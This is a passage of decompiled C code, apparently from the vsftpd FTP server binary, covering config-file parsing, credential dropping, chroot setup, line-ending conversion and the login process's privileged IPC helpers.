  if ( dword_221AA8 )
  {
    if ( !*(_QWORD *)(a1 + 176) )
    {
      v3 = sub_12AE0(0x10uLL);
      *(_QWORD *)(a1 + 176) = v3;
      *v3 = 0LL;
      v3[1] = 0LL;
    }
    sub_D520((__int64)v4);
    if ( !(unsigned int)sub_D990(*(_QWORD *)(a1 + 176), (__int64)v4) )
    {
      if ( (int)sub_D980(*(_QWORD *)(a1 + 176)) <= 99 )
        sub_D9F0(*(_QWORD *)(a1 + 176), (__int64)v4, 0LL);
      v5[0] = 0LL;
      v5[1] = 0LL;
      sub_DCF0((__int64)v5, qword_221C58, 0xFA0u);
      sub_DB20(a1, (__int64)v5, a2);
      sub_C440((__int64)v5);
    }
    sub_C440((__int64)v4);
  }
  return __readfsqword(0x28u) ^ v6;
}
// 221AA8: using guessed type int dword_221AA8;
// 221C58: using guessed type __int64 qword_221C58;

//----- (000000000000DCF0) ----------------------------------------------------
__int64 __fastcall sub_DCF0(__int64 a1, __int64 a2, unsigned int a3)
{
  __int64 v3; // r12
  unsigned int v4; // ebx
  unsigned int v6; // r14d
  int v7; // edi
  __int64 v8; // rax
  const void *v9; // [rsp+8h] [rbp-40h] BYREF
  void *ptr[7]; // [rsp+10h] [rbp-38h] BYREF

  v3 = a3;
  ptr[1] = (void *)__readfsqword(0x28u);
  v9 = 0LL;
  ptr[0] = 0LL;
  sub_C570(a1);
  v4 = sub_137D0(a2, 1);
  if ( !(unsigned int)sub_13F40(v4) )
  {
    sub_13900(v4, (struct stat64 **)ptr);
    v6 = sub_13A20((__int64)ptr[0]);
    if ( v6 )
    {
      v8 = sub_13D50((__int64)ptr[0]);
      if ( v3 > v8 )
        v3 = v8;
      sub_A800((unsigned __int64 *)&v9, v3);
      v6 = sub_12920(v4, (__int64)v9, v3);
      if ( !(unsigned int)sub_13F40(v6) )
      {
        if ( v6 != v3 )
          sub_4B80();
        sub_C290(a1, v9, v3);
      }
    }
    sub_12BB0(ptr[0]);
    sub_A7B0((unsigned __int64 *)&v9);
    v7 = v4;
    v4 = v6;
    sub_13880(v7);
  }
  return v4;
}

//----- (000000000000DE20) ----------------------------------------------------
char *__fastcall sub_DE20(const char *a1, int a2)
{
  const char *v4; // rsi
  char **v5; // rbx
  void **v6; // rbx
  char *result; // rax
  const char *v8; // rsi
  char **v9; // rbx
  const char *v10; // rax
  const char *v11; // rsi
  char **v12; // rbx
  char *v13; // rbx
  const char *v14; // rax
  const char *v15; // rax

  while ( (unsigned int)sub_13490(*a1) )
    ++a1;
  sub_C370((__int64)qword_220C80, a1);
  sub_CD40((__int64)qword_220C80, (__int64)qword_220C70, 61);
  v4 = off_220020;
  if ( off_220020 )
  {
    v5 = &off_220020;
    while ( !sub_C600((__int64)qword_220C80, v4) )
    {
      v5 += 2;
      v4 = *v5;
      if ( !*v5 )
        goto LABEL_13;
    }
    v6 = (void **)v5[1];
    if ( *v6 )
      sub_12BB0(*v6);
    result = (char *)sub_C4F0((__int64)qword_220C70);
    if ( (_DWORD)result )
    {
      *v6 = 0LL;
    }
    else
    {
      result = sub_C550(qword_220C70);
      *v6 = result;
    }
  }
  else
  {
LABEL_13:
    result = (char *)sub_C4F0((__int64)qword_220C70);
    if ( (_DWORD)result )
    {
      if ( a2 )
      {
        v10 = (const char *)sub_C510(qword_220C80);
        sub_4BA0("missing value in config file for: ", v10);
      }
    }
    else
    {
      v8 = off_2203A0;
      if ( off_2203A0 )
      {
        v9 = &off_2203A0;
        while ( 1 )
        {
          result = (char *)sub_C600((__int64)qword_220C80, v8);
          if ( (_DWORD)result )
            break;
          v9 += 2;
          v8 = *v9;
          if ( !*v9 )
            goto LABEL_22;
        }
        sub_C750((__int64)qword_220C70);
        if ( sub_C600((__int64)qword_220C70, "YES")
          || sub_C600((__int64)qword_220C70, "TRUE")
          || sub_C600((__int64)qword_220C70, "1") )
        {
          result = v9[1];
          *(_DWORD *)result = 1;
        }
        else if ( sub_C600((__int64)qword_220C70, "NO")
               || sub_C600((__int64)qword_220C70, "FALSE")
               || (result = (char *)sub_C600((__int64)qword_220C70, "0"), (_DWORD)result) )
        {
          result = v9[1];
          *(_DWORD *)result = 0;
        }
        else if ( a2 )
        {
          v15 = (const char *)sub_C510(qword_220C80);
          sub_4BA0("bad bool value in config file for: ", v15);
        }
      }
      else
      {
LABEL_22:
        v11 = off_220240;
        if ( off_220240 )
        {
          v12 = &off_220240;
          while ( 1 )
          {
            result = (char *)sub_C600((__int64)qword_220C80, v11);
            if ( (_DWORD)result )
              break;
            v12 += 2;
            v11 = *v12;
            if ( !*v12 )
              goto LABEL_31;
          }
          if ( sub_C4F0((__int64)qword_220C70) || (unsigned __int8)sub_CEE0((__int64)qword_220C70, 0) != 48 )
          {
            result = (char *)sub_D050(qword_220C70);
            *(_DWORD *)v12[1] = (_DWORD)result;
          }
          else
          {
            v13 = v12[1];
            result = (char *)sub_D090(qword_220C70);
            *(_DWORD *)v13 = (_DWORD)result;
          }
        }
        else
        {
LABEL_31:
          if ( a2 )
          {
            v14 = (const char *)sub_C510(qword_220C80);
            sub_4BA0("unrecognised variable in config file: ", v14);
          }
        }
      }
    }
  }
  return result;
}
// 220020: using guessed type char *off_220020;
// 220240: using guessed type char *off_220240;
// 2203A0: using guessed type char *off_2203A0;
// 220C70: using guessed type _QWORD qword_220C70[2];
// 220C80: using guessed type _QWORD qword_220C80[2];

//----- (000000000000E110) ----------------------------------------------------
unsigned __int64 __fastcall sub_E110(char *s, int a2)
{
  char *v2; // rbx
  unsigned int v3; // eax
  int v4; // eax
  const char *v5; // rax
  int v7; // ebx
  unsigned int v8; // [rsp+4h] [rbp-74h] BYREF
  void *ptr; // [rsp+8h] [rbp-70h] BYREF
  __int64 v10[2]; // [rsp+10h] [rbp-68h] BYREF
  __int64 v11[2]; // [rsp+20h] [rbp-58h] BYREF
  __int64 v12[3]; // [rsp+30h] [rbp-48h] BYREF
  unsigned __int64 v13; // [rsp+48h] [rbp-30h]

  v2 = s;
  v13 = __readfsqword(0x28u);
  v10[0] = 0LL;
  v10[1] = 0LL;
  v11[0] = 0LL;
  v11[1] = 0LL;
  v12[0] = 0LL;
  v12[1] = 0LL;
  v8 = 0;
  if ( s )
  {
    if ( qword_220C90 )
      sub_12BB0(qword_220C90);
    qword_220C90 = j__strdup(s);
  }
  else
  {
    if ( !qword_220C90 )
      sub_4B30("null filename in vsf_parseconf_load_file");
    v2 = (char *)qword_220C90;
  }
  v3 = sub_DCF0((__int64)v10, (__int64)v2, 0x186A0u);
  if ( (unsigned int)sub_13F40(v3) )
  {
    if ( a2 )
      sub_4BA0("cannot read config file: ", v2);
    sub_C440((__int64)v10);
  }
  else
  {
    ptr = 0LL;
    v4 = sub_13960(v2, (struct stat64 **)&ptr);
    if ( (unsigned int)sub_13F40(v4) || (v7 = sub_13D80((__int64)ptr), v7 != j__getuid()) || !sub_13A20((__int64)ptr) )
      sub_4B80();
    sub_12BB0(ptr);
    while ( (unsigned int)sub_D0B0((__int64)v10, (__int64)v11, &v8) )
    {
      if ( !sub_C4F0((__int64)v11)
        && (unsigned __int8)sub_CEE0((__int64)v11, 0) != 35
        && !(unsigned int)sub_CF90((__int64)v11) )
      {
        v5 = (const char *)sub_C510(v11);
        sub_DE20(v5, a2);
      }
    }
    sub_C440((__int64)v10);
    sub_C440((__int64)v11);
    sub_C440((__int64)v12);
  }
  return __readfsqword(0x28u) ^ v13;
}

//----- (000000000000E310) ----------------------------------------------------
unsigned __int64 __fastcall sub_E310(_QWORD *a1, __int64 a2, _QWORD *a3, int a4, char a5)
{
  struct passwd *v8; // rbp
  const char *v9; // rsi
  const char *v11; // rax
  const char *v12; // rax
  const char *v13; // rax
  signed int euid; // [rsp+8h] [rbp-60h]
  signed int egid; // [rsp+Ch] [rbp-5Ch]
  __int64 v16[3]; // [rsp+10h] [rbp-58h] BYREF
  unsigned __int64 v17; // [rsp+28h] [rbp-40h]

  v17 = __readfsqword(0x28u);
  if ( !sub_14FB0() )
    sub_4B30("vsf_secutil_change_credentials: not running as root");
  v8 = sub_D850(a1);
  if ( !v8 )
  {
    v13 = (const char *)sub_C510(a1);
    sub_4BA0("cannot locate user entry:", v13);
  }
  v16[0] = 0LL;
  v16[1] = 0LL;
  if ( a2 && !sub_C4F0(a2) )
  {
    sub_C3A0((__int64)v16, a2);
  }
  else
  {
    v9 = (const char *)sub_14EB0((__int64)v8);
    sub_C370((__int64)v16, v9);
  }
  if ( (a5 & 2) != 0 )
    sub_15180((__int64)v8);
  else
    sub_15150();
  egid = 0;
  euid = 0;
  if ( (a5 & 4) != 0 )
  {
    euid = sub_15050();
    egid = sub_15090();
    sub_15140((__int64)v8);
    sub_15100((__int64)v8);
  }
  if ( sub_D640(v16) )
  {
    v11 = (const char *)sub_C510(v16);
    sub_4BA0("cannot change directory:", v11);
  }
  if ( !a3 || sub_C4F0((__int64)a3) || !sub_D640(a3) )
  {
    if ( (a5 & 4) == 0 )
      goto LABEL_13;
    goto LABEL_29;
  }
  if ( (a5 & 1) != 0 )
  {
    v12 = (const char *)sub_C510(a3);
    sub_4BA0("cannot change directory:", v12);
  }
  if ( (a5 & 4) != 0 )
  {
LABEL_29:
    sub_150D0(euid);
    sub_15110(egid);
LABEL_13:
    if ( (a5 & 1) != 0 )
      sub_151B0(".");
  }
  sub_C440((__int64)v16);
  if ( (a5 & 8) != 0 )
    sub_15990();
  if ( a4 )
  {
    if ( !(unsigned int)sub_15D00() )
      return __readfsqword(0x28u) ^ v17;
    if ( !(unsigned int)sub_15C40() )
    {
      sub_15D70(a4);
      return __readfsqword(0x28u) ^ v17;
    }
    sub_15CB0();
    sub_15040((__int64)v8);
    sub_15000((__int64)v8);
    sub_15D70(a4);
  }
  else
  {
    sub_15040((__int64)v8);
    sub_15000((__int64)v8);
  }
  if ( (a5 & 0x10) != 0 )
    sub_159F0();
  return __readfsqword(0x28u) ^ v17;
}
// 15CB0: using guessed type __int64 sub_15CB0(void);
// 15D00: using guessed type __int64 sub_15D00(void);

//----- (000000000000E600) ----------------------------------------------------
unsigned __int64 __fastcall sub_E600(_BYTE *a1, unsigned int a2, int a3)
{
  _BYTE *v3; // rcx
  unsigned int v4; // r8d
  unsigned int v5; // r10d
  char v7; // r9
  int v8; // eax

  v3 = a1 + 1;
  if ( !a3 )
  {
    v4 = 0;
    if ( !a2 )
      goto LABEL_4;
    goto LABEL_7;
  }
  if ( !a2 || (v7 = a1[1], v7 != 10) )
  {
    *a1 = 13;
    v4 = 1;
    if ( !a2 )
    {
LABEL_4:
      v5 = 0;
      return ((unsigned __int64)v5 << 32) | v4;
    }
LABEL_7:
    v7 = a1[1];
    goto LABEL_8;
  }
  v4 = 0;
LABEL_8:
  v8 = 0;
  v5 = 0;
  while ( 1 )
  {
    if ( v7 == 13 )
    {
      if ( a2 - 1 == v8 )
      {
        v5 = 1;
      }
      else if ( a1[v8 + 2] != 10 )
      {
        *v3 = 13;
        ++v4;
        ++v3;
      }
    }
    else
    {
      *v3 = v7;
      ++v4;
      ++v3;
    }
    if ( a2 <= ++v8 )
      break;
    v7 = a1[v8 + 1];
  }
  return ((unsigned __int64)v5 << 32) | v4;
}

//----- (000000000000E6C0) ----------------------------------------------------
__int64 __fastcall sub_E6C0(char *a1, _WORD *a2, unsigned int a3, __int64 a4)
{
  char v4; // al
  __int64 v5; // r9
  char v6; // r8

  if ( (_DWORD)a4 )
  {
    a4 = 1LL;
    v4 = 13;
  }
  else
  {
    v4 = 0;
  }
  if ( a3 )
  {
    v5 = (__int64)&a1[a3];
    a3 = 0;
    do
    {
      while ( 1 )
      {
        v6 = *a1;
        if ( *a1 != 10 || v4 == 13 )
          break;
        ++a1;
        a3 += 2;
        *a2 = 2573;
        a4 = 0LL;
        ++a2;
        v4 = 10;
        if ( (char *)v5 == a1 )
          return (a4 << 32) | a3;
      }
      ++a3;
      a4 = v6 == 13;
      ++a1;
      *(_BYTE *)a2 = v6;
      a2 = (_WORD *)((char *)a2 + 1);
      v4 = v6;
    }
    while ( (char *)v5 != a1 );
  }
  return (a4 << 32) | a3;
}

//----- (000000000000E740) ----------------------------------------------------
void __fastcall __noreturn sub_E740(__int64 a1)
{
  int v1; // r12d
  __int64 v2[2]; // [rsp+0h] [rbp-58h] BYREF
  __int64 v3[9]; // [rsp+10h] [rbp-48h] BYREF

  v3[3] = __readfsqword(0x28u);
  v1 = dword_221C18 != 0;
  if ( dword_221A60 )
    v1 |= 2u;
  v2[0] = 0LL;
  v2[1] = 0LL;
  v3[0] = 0LL;
  v3[1] = 0LL;
  sub_C370((__int64)v2, qword_221B58);
  if ( qword_2219F0 )
    sub_C370((__int64)v3, (const char *)qword_2219F0);
  if ( dword_221BE8 )
  {
    if ( !sub_C4F0((__int64)v3) )
      sub_D640(v3);
  }
  else
  {
    sub_E310(v2, 0LL, v3, v1, 19);
  }
  sub_C440((__int64)v2);
  sub_C440((__int64)v3);
  if ( dword_221C38 )
    nullsub_10();
  sub_4D00(a1);
}
// 11680: using guessed type __int64 nullsub_10(void);
// 221A60: using guessed type int dword_221A60;
// 221BE8: using guessed type int dword_221BE8;
// 221C18: using guessed type int dword_221C18;
// 221C38: using guessed type int dword_221C38;

//----- (000000000000E850) ----------------------------------------------------
void __fastcall __noreturn sub_E850(__int64 a1)
{
  __int64 v1; // rax
  __int64 v2; // rbp

  if ( dword_221C38 )
  {
    v1 = sub_11640();
    v2 = v1;
    if ( v1 )
    {
      sub_11D90(v1, a1);
      if ( (int)sub_11660(v2, sub_E740, a1) > 0 )
      {
        sub_11670(v2);
        nullsub_9(v2);
        sub_12C90(0);
      }
      sub_4B80();
    }
    sub_4B80();
  }
  sub_E740(a1);
}
// 11640: using guessed type __int64 sub_11640(void);
// 11650: using guessed type __int64 __fastcall nullsub_9(_QWORD);
// 11660: using guessed type __int64 __fastcall sub_11660(_QWORD, _QWORD, _QWORD);
// 11670: using guessed type __int64 __fastcall sub_11670(_QWORD);
// 221C38: using guessed type int dword_221C38;

//----- (000000000000E8E0) ----------------------------------------------------
__int64 __fastcall sub_E8E0(__int64 a1, _QWORD *a2)
{
  __int64 result; // rax

  result = sub_FBC0((_QWORD *)a1, a2);
  if ( (_DWORD)result != 1 )
  {
    if ( (_DWORD)result == 2 )
    {
      *(_DWORD *)(a1 + 72) = 1;
      sub_6EC0((_WORD **)a1);
    }
    sub_4B30("bad state in vsf_one_process_login");
  }
  return result;
}

//----- (000000000000E920) ----------------------------------------------------
__int64 __fastcall sub_E920(_WORD **a1)
{
  __int16 v1; // ax

  v1 = sub_14B80(a1[4]);
  return sub_F710(a1, v1, 1);
}

//----- (000000000000E990) ----------------------------------------------------
void __noreturn sub_E990()
{
  unsigned int v0; // eax
  __int64 v1[3]; // [rsp+0h] [rbp-18h] BYREF

  v1[1] = __readfsqword(0x28u);
  v1[0] = sub_12CC0();
  v0 = sub_12D90((unsigned int *)v1);
  if ( !(unsigned int)sub_13F40(v0) && sub_12DA0((__int64)v1) && !(unsigned int)sub_12DB0((__int64)v1) )
    sub_12C90(0);
  sub_4B80();
}
// E990: using guessed type void __noreturn sub_E990();
// 12CC0: using guessed type __int64 sub_12CC0(void);

//----- (000000000000EA20) ----------------------------------------------------
void __noreturn sub_EA20()
{
  sub_14530(0);
  sub_12C90(1);
}
// EA20: using guessed type void __noreturn sub_EA20();

//----- (000000000000EA40) ----------------------------------------------------
void __fastcall __noreturn sub_EA40(_DWORD *a1, __int64 *a2, int a3, int a4)
{
  int v6; // edx
  __pid_t v7; // ebp
  char v8; // r8
  int v9; // eax
  char *v10; // rax
  struct passwd *v11; // rax
  const char *v12; // rax
  const char *v13; // rax
  const char *v14; // rax
  const char *v15; // rsi
  const char *v16; // rax
  char v18; // [rsp+8h] [rbp-B0h]
  __int64 *v19; // [rsp+8h] [rbp-B0h]
  char v20; // [rsp+1Ch] [rbp-9Ch]
  __int64 v21[2]; // [rsp+30h] [rbp-88h] BYREF
  void *ptr[2]; // [rsp+40h] [rbp-78h] BYREF
  __int64 v23; // [rsp+50h] [rbp-68h] BYREF
  __int64 v24; // [rsp+58h] [rbp-60h]
  char *v25; // [rsp+60h] [rbp-58h] BYREF
  __int64 v26; // [rsp+68h] [rbp-50h]
  unsigned __int64 v27; // [rsp+78h] [rbp-40h]

  v27 = __readfsqword(0x28u);
  sub_125B0(3);
  sub_9160(a1[94], 1);
  if ( a1[102] )
    a1[114] = 1;
  else
    sub_12CC0();
  v25 = 0LL;
  v26 = 0LL;
  ptr[0] = 0LL;
  if ( qword_221AC8 )
  {
    v23 = sub_CA70((__int64)a2, 47);
    LODWORD(v24) = v6;
    if ( !(_DWORD)v23 )
    {
      sub_C370((__int64)&v25, (const char *)qword_221AC8);
      sub_C6A0(&v25, 47);
      sub_C660(&v25, (__int64)a2);
      v9 = sub_D6A0(&v25, (struct stat64 **)ptr);
      if ( (unsigned int)sub_13F40(v9) )
      {
        if ( (unsigned int)sub_13F50() != 8 )
          sub_4B80();
      }
      else
      {
        v10 = (char *)sub_C510(&v25);
        sub_E110(v10, 1);
      }
      sub_C440((__int64)&v25);
      sub_12BB0(ptr[0]);
    }
  }
  a1[18] = a4;
  sub_8FB0((__int64)a1);
  sub_8F60((__int64)a1);
  sub_124F0(3, (__int64)sub_E990, 0LL, 1u);
  if ( dword_221A58 && !dword_221BB0 )
  {
    v7 = sub_16A30();
    if ( v7 )
    {
LABEL_8:
      sub_8FF0((__int64)a1);
      if ( dword_221AB0 )
        nullsub_7(a1);
      sub_B4F0(a1, (__int64)sub_E990);
    }
  }
  else
  {
    v7 = sub_12C10();
    if ( v7 )
      goto LABEL_8;
  }
  v21[0] = 0LL;
  v21[1] = 0LL;
  ptr[0] = 0LL;
  ptr[1] = 0LL;
  v23 = 0LL;
  v24 = 0LL;
  v25 = 0LL;
  v26 = 0LL;
  sub_168D0();
  sub_9030((__int64)a1);
  if ( dword_221BEC )
  {
    if ( a4 )
    {
      v8 = (a3 != 0) + 18;
LABEL_15:
      if ( qword_2219F0 )
      {
        v18 = v8;
        sub_C370((__int64)ptr, (const char *)qword_2219F0);
        v8 = v18;
      }
      sub_E310(a2, (__int64)&v25, ptr, 0, v8);
      if ( sub_C4F0((__int64)&v23) )
      {
        v7 = 1;
        sub_C440((__int64)v21);
        sub_C440((__int64)ptr);
        sub_C440((__int64)&v23);
        sub_C440((__int64)&v25);
LABEL_19:
        if ( sub_138E0("/") )
          sub_4B80();
LABEL_20:
        a1[18] = v7;
        sub_6EC0((_WORD **)a1);
      }
      v7 = 1;
LABEL_37:
      sub_D640(&v23);
      sub_C440((__int64)v21);
      sub_C440((__int64)ptr);
      sub_C440((__int64)&v23);
      sub_C440((__int64)&v25);
      if ( !a4 )
        goto LABEL_20;
      goto LABEL_19;
    }
    v15 = qword_221A00;
    a1[19] = 1;
    sub_C370((__int64)v21, v15);
    if ( dword_2219D0 )
    {
      v20 = 23 - (a3 == 0);
    }
    else
    {
      v7 = 1;
      v20 = 19;
    }
    v19 = v21;
    v11 = sub_D850(v21);
  }
  else
  {
    v8 = (a3 != 0) + 18;
    if ( a4 )
      goto LABEL_15;
    v19 = a2;
    v20 = v8 | 4;
    v11 = sub_D850(a2);
  }
  if ( !v11 )
  {
    v16 = (const char *)sub_C510(v19);
    sub_4BA0("cannot locate user entry:", v16);
  }
  v12 = (const char *)sub_14EB0((__int64)v11);
  sub_C370((__int64)&v25, v12);
  if ( qword_221A68 )
  {
    v13 = (const char *)sub_C510(a2);
    sub_CC50((__int64)&v25, (const char *)qword_221A68, v13);
  }
  if ( qword_221C50 )
  {
    sub_C370((__int64)ptr, (const char *)qword_221C50);
    if ( qword_221A68 )
    {
      v14 = (const char *)sub_C510(a2);
      sub_CC50((__int64)ptr, (const char *)qword_221A68, v14);
    }
  }
  if ( dword_221AB4 && (unsigned int)sub_C9C0((__int64)&v25, "/./") )
  {
    sub_CC40((__int64)&v25, (__int64)&v23, "/./");
    sub_C3A0((__int64)ptr, (__int64)&v25);
  }
  sub_E310(v19, (__int64)&v25, ptr, 0, v20);
  if ( sub_C4F0((__int64)&v23) )
  {
    sub_C440((__int64)v21);
    sub_C440((__int64)ptr);
    sub_C440((__int64)&v23);
    sub_C440((__int64)&v25);
    goto LABEL_20;
  }
  goto LABEL_37;
}
// EADB: variable 'v6' is possibly undefined
// E990: using guessed type void __noreturn sub_E990();
// 11380: using guessed type __int64 __fastcall nullsub_7(_QWORD);
// 12CC0: using guessed type __int64 sub_12CC0(void);
// 13F50: using guessed type __int64 sub_13F50(void);
// 2219D0: using guessed type int dword_2219D0;
// 221A58: using guessed type int dword_221A58;
// 221AB0: using guessed type int dword_221AB0;
// 221AB4: using guessed type int dword_221AB4;
// 221BB0: using guessed type int dword_221BB0;
// 221BEC: using guessed type int dword_221BEC;

//----- (000000000000EFF0) ----------------------------------------------------
void __fastcall __noreturn sub_EFF0(__int64 a1)
{
  __pid_t v2; // eax
  unsigned int v3; // edi
  int v4; // eax
  unsigned int v5; // edi
  int v6; // eax
  int v7; // edi
  int v8; // r12d
  int v9; // r15d
  int v10; // r12d
  unsigned int v11; // eax
  int v12; // r12d
  char v13; // r12
  int v14; // eax
  unsigned int v15; // eax
  void *ptr; // [rsp+8h] [rbp-70h] BYREF
  __int64 v17[2]; // [rsp+10h] [rbp-68h] BYREF
  __int64 v18; // [rsp+20h] [rbp-58h] BYREF
  __int64 v19; // [rsp+28h] [rbp-50h]
  unsigned __int64 v20; // [rsp+38h] [rbp-40h]

  v20 = __readfsqword(0x28u);
  sub_124F0(2, (__int64)sub_EA20, 0LL, 1u);
  sub_16910();
  sub_8F60(a1);
  if ( dword_221AB0 )
    nullsub_5(a1);
  sub_124F0(3, (__int64)sub_E990, 0LL, 1u);
  if ( dword_221A58 )
    v2 = sub_16A30();
  else
    v2 = sub_12C10();
  if ( v2 )
  {
    sub_8FF0(a1);
    if ( dword_221AB0 )
      nullsub_6(a1);
    while ( (unsigned __int8)sub_9100(*(_DWORD *)(a1 + 376)) == 1 )
    {
      v3 = *(_DWORD *)(a1 + 376);
      v18 = 0LL;
      v19 = 0LL;
      sub_9330(v3, (__int64 *)(a1 + 80));
      sub_9330(*(_DWORD *)(a1 + 376), &v18);
      v4 = sub_9260(*(_DWORD *)(a1 + 376));
      v5 = *(_DWORD *)(a1 + 376);
      *(_DWORD *)(a1 + 408) = v4;
      v6 = sub_9260(v5);
      v7 = dword_221AB0;
      *(_DWORD *)(a1 + 412) = v6;
      if ( !v7 )
        *(_QWORD *)(a1 + 408) = 0LL;
      v8 = sub_FBC0((_QWORD *)a1, &v18);
      sub_C440((__int64)&v18);
      if ( v8 == 2 )
      {
        sub_C370(a1 + 80, qword_221B58);
        sub_EA40((_DWORD *)a1, (__int64 *)(a1 + 80), 1, 1);
      }
      if ( v8 == 3 )
      {
        v9 = dword_221C30;
        v10 = dword_221C30 != 0;
        if ( dword_221B48 )
        {
          v18 = 0LL;
          v19 = 0LL;
          v11 = sub_DCF0((__int64)&v18, qword_221B78, 0x186A0u);
          if ( (unsigned int)sub_13F40(v11) )
            sub_4BA0("could not read chroot() list file:", (const char *)qword_221B78);
          if ( (unsigned int)sub_D180((__int64)&v18, a1 + 80) )
            v10 = v9 == 0;
          sub_C440((__int64)&v18);
        }
        sub_EA40((_DWORD *)a1, (__int64 *)(a1 + 80), v10, 0);
      }
      if ( v8 != 1 )
        sub_4B30("weird state in process_login_request");
      sub_9160(*(_DWORD *)(a1 + 376), 2);
    }
    sub_4B80();
  }
  sub_168D0();
  sub_9030(a1);
  if ( dword_221AB0 )
    nullsub_7(a1);
  if ( dword_221B50 )
  {
    if ( dword_221BD0 )
    {
      v15 = sub_DCF0(a1 + 232, qword_221B00, 0x186A0u);
      if ( (unsigned int)sub_13F40(v15) )
        sub_4BA0("cannot read user list file:", (const char *)qword_221B00);
    }
  }
  v17[0] = 0LL;
  v17[1] = 0LL;
  v18 = 0LL;
  v19 = 0LL;
  v12 = -(dword_221AB0 == 0);
  sub_C370((__int64)v17, (const char *)qword_221C78);
  v13 = (v12 & 8) + 17;
  sub_C370((__int64)&v18, (const char *)qword_221AC0);
  ptr = 0LL;
  v14 = sub_D6C0(&v18, (struct stat64 **)&ptr);
  if ( !(unsigned int)sub_13F40(v14) )
  {
    sub_12BB0(ptr);
    sub_E310(v17, (__int64)&v18, 0LL, 0, v13);
    sub_C440((__int64)v17);
    sub_C440((__int64)&v18);
    sub_4D00(a1);
  }
  sub_4BA0("vsftpd: not found: directory given in 'secure_chroot_dir':", (const char *)qword_221AC0);
}
// E990: using guessed type void __noreturn sub_E990();
// EA20: using guessed type void __noreturn sub_EA20();
// 11360: using guessed type __int64 __fastcall nullsub_5(_QWORD);
// 11370: using guessed type __int64 __fastcall nullsub_6(_QWORD);
// 11380: using guessed type __int64 __fastcall nullsub_7(_QWORD);
// 221A58: using guessed type int dword_221A58;
// 221AB0: using guessed type int dword_221AB0;
// 221AC0: using guessed type __int64 qword_221AC0;
// 221B00: using guessed type __int64 qword_221B00;
// 221B48: using guessed type int dword_221B48;
// 221B50: using guessed type int dword_221B50;
// 221B78: using guessed type __int64 qword_221B78;
// 221BD0: using guessed type int dword_221BD0;
// 221C30: using guessed type int dword_221C30;
// 221C78: using guessed type __int64 qword_221C78;

//----- (000000000000F400) ----------------------------------------------------
__int64 __fastcall sub_F400(__int64 a1, _QWORD *a2)
{
  __int64 result; // rax

  sub_9070(*(_DWORD *)(a1 + 380), 1);
  sub_91E0(*(_DWORD *)(a1 + 380), (_QWORD *)(a1 + 80));
  sub_91E0(*(_DWORD *)(a1 + 380), a2);
  sub_91B0(*(_DWORD *)(a1 + 380), *(_DWORD *)(a1 + 408));
  sub_91B0(*(_DWORD *)(a1 + 380), *(_DWORD *)(a1 + 412));
  result = sub_90A0(*(_DWORD *)(a1 + 380));
  if ( (_BYTE)result == 1 )
  {
    if ( !*(_DWORD *)(a1 + 408) )
      sub_12C90(0);
    sub_113B0(a1);
  }
  if ( (_BYTE)result != 2 )
    sub_4B80();
  return result;
}

//----- (000000000000F4C0) ----------------------------------------------------
__int64 __fastcall sub_F4C0(__int64 a1)
{
  unsigned __int16 v1; // bp
  char v2; // al

  v1 = sub_14B80(*(_WORD **)(a1 + 32));
  sub_9070(*(_DWORD *)(a1 + 380), 3);
  sub_91B0(*(_DWORD *)(a1 + 380), v1);
  v2 = sub_90A0(*(_DWORD *)(a1 + 380));
  if ( v2 == 2 )
    return 0xFFFFFFFFLL;
  if ( v2 != 1 )
    sub_4B80();
  return sub_91A0(*(unsigned int *)(a1 + 380));
}
// 91A0: using guessed type __int64 __fastcall sub_91A0(_QWORD);

//----- (000000000000F540) ----------------------------------------------------
__int64 __fastcall sub_F540(__int64 a1)
{
  __int64 result; // rax

  sub_9070(*(_DWORD *)(a1 + 380), 10);
  result = sub_90A0(*(_DWORD *)(a1 + 380));
  if ( (_BYTE)result != 1 )
    sub_4B80();
  return result;
}

//----- (000000000000F580) ----------------------------------------------------
__int64 __fastcall sub_F580(__int64 a1)
{
  sub_9070(*(_DWORD *)(a1 + 380), 11);
  return sub_9260(*(_DWORD *)(a1 + 380));
}

//----- (000000000000F5A0) ----------------------------------------------------
__int64 __fastcall sub_F5A0(__int64 a1)
{
  sub_9070(*(_DWORD *)(a1 + 380), 12);
  return sub_9260(*(_DWORD *)(a1 + 380));
}

//----- (000000000000F5D0) ----------------------------------------------------
__int64 __fastcall sub_F5D0(__int64 a1)
{
  char v1; // al

  sub_9070(*(_DWORD *)(a1 + 380), 13);
  v1 = sub_90A0(*(_DWORD *)(a1 + 380));
  if ( v1 == 2 )
    return sub_9260(*(_DWORD *)(a1 + 380));
  if ( v1 != 1 )
    sub_4B80();
  return sub_91A0(*(unsigned int *)(a1 + 380));
}
// 91A0: using guessed type __int64 __fastcall sub_91A0(_QWORD);

//----- (000000000000F630) ----------------------------------------------------
__int64 __fastcall sub_F630(__int64 a1, unsigned int a2)
{
  __int64 result; // rax

  sub_9070(*(_DWORD *)(a1 + 380), 2);
  sub_9190(*(unsigned int *)(a1 + 380), a2);
  result = sub_90A0(*(_DWORD *)(a1 + 380));
  if ( (_BYTE)result != 1 )
    sub_4B80();
  return result;
}
// 9190: using guessed type __int64 __fastcall sub_9190(_QWORD, _QWORD);

//----- (000000000000F690) ----------------------------------------------------
unsigned __int64 __fastcall sub_F690(__int64 a1, __int64 a2)
{
  char *v3[3]; // [rsp+0h] [rbp-38h] BYREF
  unsigned __int64 v4; // [rsp+18h] [rbp-20h]

  v3[0] = 0LL;
  v3[1] = 0LL;
  v4 = __readfsqword(0x28u);
  sub_C3A0((__int64)v3, a1 + 280);
  sub_C6A0(v3, 47);
  sub_C660(v3, a2);
  sub_161E0((__int64)v3);
  sub_C440((__int64)v3);
  return __readfsqword(0x28u) ^ v4;
}

//----- (000000000000F710) ----------------------------------------------------
__int64 __fastcall sub_F710(_WORD **a1, __int16 a2, int a3)
{
  unsigned int v4; // ebx
  __int16 v5; // r13
  int v6; // r12d
  unsigned __int8 v7; // al
  const struct sockaddr *v8; // rsi
  unsigned int v9; // eax
  int v11; // edi

  v4 = sub_14B00(*a1);
  if ( sub_14BF0(a2) )
    sub_4B80();
  v5 = dword_221A60;
  if ( dword_221A60 )
    v5 = dword_221A08;
  v6 = 0;
  sub_12E40(v4);
  while ( 1 )
  {
    sub_147E0((void **)&qword_220CA8, (__int64)*a1);
    sub_14BC0((unsigned __int16 *)qword_220CA8, v5);
    if ( !sub_140D0(v4, (const struct sockaddr *)qword_220CA8) )
      break;
    if ( (unsigned int)sub_13F50() != 2 || v6 )
      sub_4B80();
    v7 = sub_14F20();
    sub_155D0((double)v7 * 0.00390625 + 1.0);
    v6 = 1;
  }
  if ( a3 )
  {
    v8 = (const struct sockaddr *)a1[4];
  }
